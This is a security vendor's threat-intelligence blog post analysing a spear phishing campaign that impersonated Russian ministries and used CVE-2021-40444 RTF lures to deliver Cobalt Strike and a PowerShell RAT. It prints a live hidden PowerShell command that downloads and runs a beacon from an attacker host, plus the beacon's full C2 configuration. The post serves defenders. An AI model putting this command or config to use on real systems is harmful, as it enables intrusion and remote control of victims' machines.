<div>
<p><img alt="New spear phishing campaign targets Russian dissidents" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/Screen-Shot-2022-03-29-at-10.27.20-AM-1.png" style="max-width:80%;height:auto;width:auto;"/></p>
<p><a href="https://blog.malwarebytes.com/category/threat-intelligence/" rel="category tag">Threat Intelligence</a></p>
<h1 class="entry-title p-name">
					New spear phishing campaign targets Russian dissidents				</h1>
<p>Posted: March 29, 2022 by <a href="https://blog.malwarebytes.com/author/threatintelligence/" rel="author" title="Posts by Threat Intelligence Team">Threat Intelligence Team</a>
</p>
We've identified a new campaign using a combination of exploits, malicious macros and other lures that is targeted at Russian individuals who may have violated restrictions imposed by the Russian government.
<p>This blog post was authored by Hossein Jazi.</p>
<p>Several threat actors have taken advantage of the war in Ukraine to launch a number of cyber attacks. The Malwarebytes Threat Intelligence team is activity monitoring these threats and has observed activities associated with the geopolitical conflict.</p>
<p>More specifically, we’ve witnessed several APT actors such as <a href="https://twitter.com/h2jazi/status/1501198521139175427">Mustang Panda</a>, <a href="https://twitter.com/h2jazi/status/1500607147989684224">UNC1151</a> and <a href="https://twitter.com/h2jazi/status/1505887653111209994">SCARAB</a> that have used war-related themes to target mostly Ukraine. We’ve also observed several different <a href="https://blog.malwarebytes.com/threat-intelligence/2022/03/hermeticwiper-a-detailed-analysis-of-the-destructive-malware-that-targeted-ukraine/">wipers</a> and cybercrime groups such as <a href="https://blog.malwarebytes.com/threat-intelligence/2022/03/formbook-spam-campaign-targets-citizens-of-ukraine%EF%B8%8F/">FormBook</a> using the same tactics. Beside those known groups we saw an <a href="https://twitter.com/h2jazi/status/1501941517409083397">actor</a> that used multiple methods to deploy a variants of Quasar Rat. These methods include using documents that exploit CVE-2017-0199 and CVE-2021-40444, macro-embedded documents, and executables. </p>
<p>On March 23, we identified a new campaign that instead of targeting Ukraine is focusing on Russian citizens and government entities. Based on the email content it is likely that the threat actor is targeting people that are against the Russian government.</p>
<p>The spear phishing emails are warning people that use websites, social networks, instant messengers and VPN services that have been banned by the Russian Government and that criminal charges will be laid. Victims are lured to open a malicious attachment or link to find out more, only to be infected with Cobalt Strike or a Remote Administration Trojan (Rat).</p>
<h2>Spear phishing as the main initial infection vector</h2>
<p>These emails pretend to be from the “Ministry of Digital Development, Telecommunications and Mass Communications of the Russian Federation” and “Federal Service for Supervision of Communications, Information Technology and Mass Communications” of Russia.</p>
<p>We have observed two documents associated with this campaign that both exploit CVE-2021-40444. Even though CVE-2021-40444 has been used in a few attacks in the past, to the best of our knowledge this was the first time we observed an attacker use RTF files instead of Word documents to exploit this vulnerability. Also the actor leveraged a new variant of this exploit called CABLESS in this attack. <a href="https://news.sophos.com/en-us/2021/12/21/attackers-test-cab-less-40444-exploit-in-a-dry-run/">Sophos</a> has reported an attack that used a Cabless variant of this exploit but in that case the actor has not used the RTF file and also used RAR file to prepend the WSF data to it.</p>
<ul><li>Email with RTF file: <ul><li>Федеральная служба по надзору в сфере связи, информационных технологий и массовых коммуникаций (Federal Service for Supervision of Communications, Information Technology and Mass Communications)</li><li>Предупреждение! Министерство цифрового развития, связи и массовых коммуникаций Российской Федерации (A warning! Ministry of Digital Development, Telecommunications and Mass Media of the Russian Federation)</li></ul></li></ul>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/phish1-2.png" title=""><img alt="" class="wp-image-55325" height="502" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/phish1-2.png" style="max-width:800px;height:auto;width:auto;" width="1915"/></a><figcaption>Figure 1: Phishing template</figcaption></figure>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/phish2.png" title=""><img alt="" class="wp-image-55326" height="506" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/phish2.png" style="max-width:800px;height:auto;width:auto;" width="1919"/></a><figcaption>Figure 2: Phishing template </figcaption></figure>
<ul><li>Email with archive file: <ul><li>информирование населения об критических изменениях в сфере цифровых технологий, сервисов, санкций и уголовной ответственности за их использование. (informing the public about critical changes in the field of digital technologies, services, sanctions and criminal liability for their use.)</li><li>Внимание! Информирует Министерство цифрового развития, связи и массовых коммуникаций Российской Федерации (Attention! Informs the Ministry of Digital Development, Communications and Mass Media of the Russian Federation)</li></ul></li></ul>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/phish4.png" title=""><img alt="" class="wp-image-55329" height="534" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/phish4.png" style="max-width:800px;height:auto;width:auto;" width="1937"/></a><figcaption>Figure 3: Phishing template </figcaption></figure>
<ul><li>Email with link:<ul><li>Внимание! Информирует Министерство цифрового развития, связи и массовых коммуникаций Российской Федерации (Attention! Informs the Ministry of Digital Development, Communications and Mass Media of the Russian Federation)</li></ul></li></ul>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/phish3.png" title=""><img alt="" class="wp-image-55330" height="524" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/phish3.png" style="max-width:800px;height:auto;width:auto;" width="1925"/></a><figcaption>Figure 4: phishing template </figcaption></figure>
<h2>Victimology</h2>
<p>The actor has sent its spear phishing emails to people that had email with these domains: </p>
<p>mail.ru, mvd.ru, yandex.ru, cap.ru, minobr-altai.ru, yandex.ru, stavminobr.ru, mon.alania.gov.ru, astrobl.ru, 38edu.ru, mosreg.ru, mo.udmr.ru, minobrnauki.gov.ru, 66.fskn.gov.ru, bk.ru, ukr.net</p>
<p>Based on these domains, here is the list of potential victims:</p>
<ul><li>Portal of authorities of the Chuvash Republic Official Internet portal</li><li>Russian Ministry of Internal Affairs</li><li>ministry of education and science of the republic of Altai </li><li>Ministry of Education of the Stavropol Territory</li><li>Minister of Education and Science of the Republic of North Ossetia-Alania</li><li>Government of Astrakhan region </li><li>Ministry of Education of the Irkutsk region </li><li>Portal of the state and municipal service Moscow region </li><li>Ministry of science and higher education of the Russian Federation</li></ul>
<h2>Analysis:</h2>
<p>The lures used by the threat actor are in Russian language and pretend to be from Russia’s “Ministry of Information Technologies and Communications of the Russian Federation” and “MINISTRY OF DIGITAL DEVELOPMENT, COMMUNICATIONS AND MASS COMMUNICATIONS”. One of them is a letter about limitation of access to Telegram application in Russia. </p>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/russia.png" title=""><img alt="" class="wp-image-55293" height="846" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/russia.png" width="610"/></a><figcaption>Figure 5: Lure letter</figcaption></figure>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/cveblock.png" title=""><img alt="" class="wp-image-55369" height="647" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/cveblock.png" style="max-width:800px;height:auto;width:auto;" width="1119"/></a><figcaption>Figure 6: Lure template</figcaption></figure>
<p>
These RTF files contains an embedded url that downloads an html file which exploits the vulnerability in the MSHTML engine.
<code>http://wallpaper.skin/office/updates/GtkjdsjkyLkjhsTYhdsd/exploit.html</code> </p>
<p>The html file contains a script that executes the script in WSF data embedded in the RTF file. </p>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/Screen-Shot-2022-03-25-at-2.37.47-PM.png" title=""><img alt="" class="wp-image-55296" height="286" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/Screen-Shot-2022-03-25-at-2.37.47-PM.png" style="max-width:800px;height:auto;width:auto;" width="1855"/></a><figcaption>Figure 7: html file</figcaption></figure>
<p>
The actor has added WSF data (Windows Script Host) at the start of the RTF file. As you can see from figure 8, WSF data contains a JScript code that can be accessed from a remote location. In this case this data has been accessed using the downloaded html exploit file. </p>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/Screen-Shot-2022-03-25-at-1.43.00-PM.png" title=""><img alt="" class="wp-image-55295" height="357" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/Screen-Shot-2022-03-25-at-1.43.00-PM.png" style="max-width:800px;height:auto;width:auto;" width="647"/></a><figcaption>Figure 8: WSF data</figcaption></figure>
<p>Executing this scripts leads to spawning PowerShell to download a CobaltStrike beacon from the remote server and execute it on the victim’s machine. (The deployed CobaltStrike file name is Putty) </p>
<code>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -windowstyle hidden $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest 'http://wallpaper.skin/office/updates/GtkjdsjkyLkjhsTYhdsd/putty.exe' -OutFile $env:TEMP\putty.exe; . $env:TEMP\putty.exe; Start-Sleep 15</code>
<p>The following shows the CobaltStrike config:</p>
<code>{
 "BeaconType": [
 "HTTPS"
 ],
 "Port": 443,
 "SleepTime": 38500,
 "MaxGetSize": 1398151,
 "Jitter": 27,
 "C2Server": "wikipedia-book.vote,/async/newtab_ogb",
 "HttpPostUri": "/gen_204",
 "Malleable_C2_Instructions": [
 "Remove 17 bytes from the end",
 "Remove 32 bytes from the beginning",
 "Base64 URL-safe decode"
 ],
 "SpawnTo": "/4jEZLD/DHKDj1CbBvlJIg==",
 "HttpGet_Verb": "GET",
 "HttpPost_Verb": "POST",
 "HttpPostChunk": 96,
 "Spawnto_x86": "%windir%\\syswow64\\gpupdate.exe",
 "Spawnto_x64": "%windir%\\sysnative\\gpupdate.exe",
 "CryptoScheme": 0,
 "Proxy_Behavior": "Use IE settings",
 "Watermark": 1432529977,
 "bStageCleanup": "True",
 "bCFGCaution": "True",
 "KillDate": 0,
 "bProcInject_StartRWX": "True",
 "bProcInject_UseRWX": "False",
 "bProcInject_MinAllocSize": 16700,
 "ProcInject_PrependAppend_x86": [
 "kJCQ",
 "Empty"
 ],
 "ProcInject_PrependAppend_x64": [
 "kJCQ",
 "Empty"
 ],
 "ProcInject_Execute": [
 "ntdll.dll:RtlUserThreadStart",
 "SetThreadContext",
 "NtQueueApcThread-s",
 "kernel32.dll:LoadLibraryA",
 "RtlCreateUserThread"
 ],
 "ProcInject_AllocationMethod": "NtMapViewOfSection",
 "bUsesCookies": "True",
 "HostHeader": ""
}</code>
<h2>Related attack</h2>
<p>We have also identified new activity on March 28th that is associated with this same actor. In this new activity they distributed a macro embedded-document to deploy a PowerShell based Rat. This document uses “Федеральная служба по надзору в сфере связи, информационных технологий и массовых коммуникаций” (Federal Service for Supervision of Communications, Information Technology and Mass Communications) of Russia as a template which is also used in phishing emails described in the previous section. There is also infrastructure overlap with the other campaigns. </p>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/block-doc1.png" title=""><img alt="" class="wp-image-55368" height="874" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/block-doc1.png" style="max-width:800px;height:auto;width:auto;" width="678"/></a><figcaption>Figure 9: template</figcaption></figure>
<p>The dropped PowerShell script is obfuscated using a combination of Base64 and custom obfuscation. </p>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/ps-dropped.png" title=""><img alt="" class="wp-image-55361" height="802" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/ps-dropped.png" style="max-width:800px;height:auto;width:auto;" width="1767"/></a><figcaption>Figure 10: Dropped PS script</figcaption></figure>
<p>After deobfuscating the script, you can see the Rat deployed by this actor. This PowerShell based Rat has the capability to get the next stage payload and execute it. The next stage payload can be one of the following file types:</p>
<ul><li>JavaScript</li><li>PowerShell</li><li>Executable</li><li>DLL</li></ul>
<p>All of Its communications with its server are in Base64 format. This Rat starts its activity by setting up some configurations which include the C2 url, intervals, debug mode and a parameter named group that initialized with “Madagascar” which probably is the alias of the threat actor. </p>
<p>After setting up the configuration, it calls the “Initialize-Engine” function. This function collects the victim’s info including OS info, Username, Hostname, Bios info and also a host-domain value that shows if the machine in a domain member or not. It then appends all the collected into into a string and separate them by “|” character and at the end it add the group name and API config value. The created string is being send to the server using Send-WebInit function. This function adds “INIT%%%” string to the created string and base64 encodes it and sends it to the server.
</p>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/ps-deobfuscated.png" title=""><img alt="" class="wp-image-55362" height="776" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/ps-deobfuscated.png" style="max-width:800px;height:auto;width:auto;" width="968"/></a><figcaption>Figure 11: PowerShell Rat</figcaption></figure>
<p>After performing the initialization, it goes into a loop that keeps calling the “Invoke-Engine” function. This function checks the incoming tasks from the server, decodes them and calls the proper function to execute the incoming task. If there is no task to execute, it sends “GETTASK%%” in Base64 format to its server to show it is ready to get tasks and execute them. The “IC” command is used to delete itself.</p>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/invoke-task.png" title=""><img alt="" class="wp-image-55365" height="448" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/invoke-task.png" width="550"/></a><figcaption>Figure 12: Invoke task</figcaption></figure>
<p>The result of the task execution will be send to the server using “PUTTASK%%” command. </p>
<h2>Infrastructure</h2>
<p>The following shows the infrastructure used by this actor highlighting that the different lures are all connected. </p>
<figure class="aligncenter size-full"><a href="https://blog.malwarebytes.com/wp-content/uploads/2022/03/undefined.png" title=""><img alt="" class="wp-image-55363" height="802" src="https://blog.malwarebytes.com/wp-content/uploads/2022/03/undefined.png" style="max-width:800px;height:auto;width:auto;" width="1560"/></a><figcaption>Figure 12: Infrastructure </figcaption></figure>
<p>The Malwarebytes Threat Intelligence continues to monitor cyber attacks related to the Ukraine war. We are protecting our customers and sharing additional indicators of compromise.</p>
<h2>IOCs</h2>
<p>RTF files host domain: 
digital-ministry[.]ru
RTF files:
PKH telegram.rtf
b19af42ff8cf0f68e520a88f40ffd76f53a27dffa33b313fe22192813d383e1e
PKH.rtf 
38f2b578a9da463f555614e9ca9036337dad0af4e03d89faf09b4227f035db20
MSHTML exploit: 
wallpaper[.]skin/office/updates/GtkjdsjkyLkjhsTYhdsd/exploit.html
4e1304f4589a706c60f1f367d804afecd3e08b08b7d5e6bd8c93384f0917385c
CobaltStrike Download URL:
wallpaper[.]skin/office/updates/GtkjdsjkyLkjhsTYhdsd/putty.exe
CobaltStrike:
Putty.exe
d4eaf26969848d8027df7c8c638754f55437c0937fbf97d0d24cd20dd92ca66d
CobaltStrike C2:
wikipedia-book[.]vote/async/newtab_ogb
Macro based maldoc: 
c7dd490adb297b7f529950778b5a426e8068ea2df58be5d8fd49fe55b5331e28
PowerShell based RAT:
9d4640bde3daf44cc4258eb5f294ca478306aa5268c7d314fc5019cf783041f0
PowerShell Rat C2:
swordoke[.]com
</p>
<p>
</p>
<p>SHARE THIS ARTICLE</p>
<a class="socicon-facebook" href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.malwarebytes.com%2F%3Fp%3D55292&amp;t=New+spear+phishing+campaign+targets+Russian+dissidents" id="social-share-facebook" target="_blank"></a>
<a class="socicon-twitter" href="https://twitter.com/intent/tweet?text=New+spear+phishing+campaign+targets+Russian+dissidents+https%3A%2F%2Fblog.malwarebytes.com%2F%3Fp%3D55292&amp;via=Malwarebytes" id="social-share-twitter" target="_blank"></a>
<a class="socicon-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fblog.malwarebytes.com%2F%3Fp%3D55292&amp;title=New+spear+phishing+campaign+targets+Russian+dissidents&amp;summary=&amp;source=" id="social-share-linkedin" target="_blank"></a>
<p>COMMENTS</p>
<p>RELATED ARTICLES</p>
<p>ABOUT THE AUTHOR</p>
<img alt="" class="avatar avatar-96 photo grav-hashed grav-hijack" height="96" id="grav-147cd7280d6ece931e4488a3a10809d9-0" src="https://secure.gravatar.com/avatar/147cd7280d6ece931e4488a3a10809d9?s=96&amp;d=identicon&amp;r=g" width="96"/>
<p>
<a href="https://blog.malwarebytes.com/author/threatintelligence/" rel="author" title="Posts by Threat Intelligence Team">Threat Intelligence Team</a>
</p>
<p></p>
</div>